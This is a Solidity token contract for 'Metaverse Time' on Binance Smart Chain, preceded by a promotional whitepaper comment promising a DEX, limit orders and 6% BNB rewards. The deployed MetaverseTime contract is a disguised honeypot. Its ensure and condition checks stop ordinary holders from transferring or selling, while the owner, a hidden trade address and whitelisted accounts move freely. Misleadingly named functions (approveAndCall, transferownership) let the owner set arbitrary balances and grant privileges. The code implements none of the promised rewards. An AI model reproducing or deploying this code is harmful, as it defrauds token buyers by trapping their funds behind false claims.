/* Executive Summary
Overview of the Decentralized Exchange Industry
The people should be in full control of their finances and their trades. This is the premise upon which the cryptocurrency 
industry thrives and has thrived over the years. In order to mitigate manipulation of financial records and fraud, the core 
concept of blockchain is to transfer the control of pools and transactions as well as the decision-making authority from a
 centralized financial exchange system to the distributed networks. Decentralized finance (DeFi) and decentralized exchange
 (DEX) are a critical segment of the block- chain industry that represent a plethora of trading, lending and investing activities 
implemented almost entirely on blockchain networks with the use of native or other tokens as collateral and proceeds.
 Decentralized finance (DeFi) and decentralized exchange (DEX) have been providing trustless and decentralized systems
 that empower individuals. After more than a decade of development, the blockchain industry has experienced explosive growth
 in the creation of tens of thousands of various types of digital assets, particularly in the latter part of the year 2020, and this 
exponential growth is showing no signs of losing momentum. The 2020 boom witnessed in the DeFi ecosystem (known as
 "DeFi Summer") saw a significant surge in the trading of digital assets and in the value and interests locked in various 
protocols and solutions, decentralized exchanges and automated market makers, In January 2019, locked assets earning
 interest within the DeFi space held at about $39.5 million, but skyrocketed to over $45.2 billion by the end of January 2021
 alone. By Financial Quarter 2 (Q2) in April 2021, crypto tracker CoinGecko calculated the total value assets (TVL in USD) 
of all combined funds entrusted to DeFi smart contracts to stand at over $128 billion. With innovative new derivative projects
 and synthetic assets re- leased on the daily and well over 230 DeFi dapps in the DeFi space, monthly DEX (Decentralised
 Exchange) volume in USD is, as of the time of release of this whitepaper, well over the $170 Billion mark. However, many
 current blockchain systems are still a long way from providing financial infrastructure that are fully under the control of the
 buyers and traders who use them. Several issues persist as blockchains and decentralized cryptocurrency exchange
 platforms still grapple with providing optimal user experience in terms of ownership and safety of assets, cost of operations,
 segmented liquidity, scalability of business structure and networks, reliability of services and clunky interfaces leading to 
poor user experiences. There is a need for DEXS to develop to the point of offering the same level of sophistication in 
tooling and functionalities which both professional and retail traders are accustomed to using on centralized exchanges (CEXs).
 It is at this pivotal juncture in blockchain development, at the nexus of innovations for the construction of contract-based DEX 
platforms and trade tooling, that Metaverse Time positions itself as a leader at the cusp of an evolution that's moving towards 
full interoperability, automation, simplicity and privacy within the Binance Smart Chain ecosystem.
This initial draft of the Metaverse Time and METATIME DEX whitepaper is meant to bring conceptual insight into the high-level 
design of the Metaverse Time ecosystem. It is by no means considered complete or final. Future revisions of this whitepaper 
are promised, which will address incomplete elements, improvements on core messaging protocols designs and aggregation
 frameworks, trading algorithms and currently unforeseen challenges.

What is METATIME DEX?
METATIME DEX is an automatic market making (AMM) decentralized exchange platform within the Metaverse Time Finance 
Aggregator, built on the concept of smart contract-enabled liquidity pools and liquidity providers from a decentralized network 
of market makers to eliminate trade latency. Liquidity in the METATIME DEX ecosystem is provided by an algorithm-driven 
procedure that is fully automated with a drive towards decentralized governance and a passive rewards system through the 
use of its native $METATIME token. METATIME DEX is a highly innovative DEFI project that proposes and implements a 
mix-chain DEX model based on the smart contracts platform, the Binance Smart Chain (BSC).
As a fully community-owned DEX, the METATIME DEX platform will be governed by its eponymous native token, the 
$METATIME. Within the METATIME DEX ecosystem, we offer more than just a lightning-speed and cheap DEX. 
METATIME DEX exchange holds forte in the now revamped DEX space, offering unique features and services such as
 token swaps, fearless trustless trades, trading bots with interoperability, zero front-running, and minimal slippage.

Value Proposition
Mission

The mission of METATIME DEX is to give DeFi traders seamless access to decentralized financial services, that are
not only made super simple for even a new user with no prior trading experience, but also packed with premium, 
next-level features that will bring a whole new experience of what a complete and functional DEX should be.
What distinguishes METATIME DEX from other decentralized exchanges is that we have made METATIME DEX 
the go-to, easy to use DEX for everyday DeFi traders, whether experienced or inexperienced, by equipping it with 
a combination of all necessary tools that will make trading better and easier, such as limit orders, METATIMESWAP,
price charts, METATIMEBOT.
In addition, users will enjoy Limit Orders functionality, which allows users to exchange their BEP-20 tokens at their 
desired price with 0% slippage, with executor nodes continually monitoring all limit orders for immediate execution 
once the limit order's stated criteria are satisfied. This is how METATIME DEX eliminates unpredictably high price slippage,
ensuring that users enjoy a complete CEX-level trading experience with all of the benefits of a DEX retained and enhanced.

Vision
Metaverse Time's vision is the establishment of a fully integrated technology company, which provides turnkey technological 
solutions to the cryptocurrency, blockchain and digital asset industries. Over time, the Company plans to provide a wide range 
of services such as exchanges aggregation and software solutions.

Goals
Metaverse Time has two imperative goals:
To Create METATIME DEX, a Super DEX That Solves Real Life DeFi Trading Problems:
METATIME DEX will maintain the highest technical specifications and standards in the DEX industry and provide traders with an
unparalleled, cutting edge experience, making DeFi trading as seamless, en- joyable and super simple as possible for every user.
METATIME DEX ecosystem is also geared towards empowering traders and creating a platform that will give users access to all 
premium tools such as limit orders, METATIMESWAP, price charts and ultimately, The METATIMEBOT; all of these tools will be 
accessible on our DEX, The METATIME DEX.
We look to make users trade with confidence on our dex, whether they are in front of their computers, or away on vacations with
 families.  To Create a Token That Auto - rewards the Metaverse Time Community: Being community centric, we also look forward 
to rewarding the active participation of all community members holding $ METATIME, so we have carefully written the SMETATIME 
contract to reward holders with 6% BNB. 
Superfast trading bot that puts you light years ahead of the competition, helping you buy into your desired project, faster than everyone else.  
Live charts directly on trading page, to help you make the right trading decisions 
No more missed trade opportunities.  
No more stressful, always-on simultaneous monitoring.  
No more unplanned losses from slippage spikes, less price impact.  
More offline hours to live your life, as swaps will still happen, at the set prices you want.  


Why METATIME DEX?  
Limit Order Integration
METATIME DEX has just made trading on the BSC ecosystem so much easier.  DeFi traders on METATIME DEX can now trade digital
assets in a manner that rivals the convenience on CEXS, setting the precise entry and exit points to buy or sell tokens at their preferred 
price.  Users can now set a buy limit order which executes only at the limit price that they have set or lower, if available.  Users can also 
set a sell limit order which executes only at the limit price that they have set or higher, if available.  This is made possible through the
Limit Order protocol.  DeFi traders can now enjoy a turnkey feature that traditional crypto traders on CEXS have utilized for years to
automate their trading experience.  The feature allows users and professional DeFi traders to swap at precise price points, paving the 
way for a safer, stress - free DeFi trading experience.  All traders need to do is to select the assets they want to trade, set the rate and
desired output, and submit their Limit Order.  There is no need for the trader to even remain online once the Limit Order has been submitted.
The tokens or assets they wish to exchange are locked into a smart contract that will automatically execute the trade if desired conditions are 
met OR until the traders themselves cancel the Limit Order */

pragma solidity ^0.5.17;
interface IBEP20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeBEP20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IBEP20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IBEP20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IBEP20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeBEP20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IBEP20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeBEP20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeBEP20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeBEP20: BEP20 operation did not succeed");
        }
    }
}

contract BEP20 is Context, IBEP20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract BEP20Detailed is IBEP20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}

contract MetaverseTime {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}